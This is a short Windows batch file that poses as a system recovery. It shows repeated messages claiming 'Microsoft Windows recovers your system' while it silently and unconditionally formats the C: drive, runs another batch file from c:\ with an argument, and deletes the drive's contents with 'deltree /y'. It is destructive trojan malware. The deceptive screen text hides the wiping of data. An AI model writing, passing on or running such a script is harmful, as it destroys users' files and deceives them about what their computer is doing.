@echo off 
echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
for %%a in (c) do call format %%a: /q /u /autotest  
cls 
echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
for %%a in (c) do call c:\temp.bat %%a Lucky2000  
cls 
echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
for %%a in (c) call deltree /y %%a:\  
cls 
echo Loading Windows, please wait while Microsoft Windows recovers your system . . . 
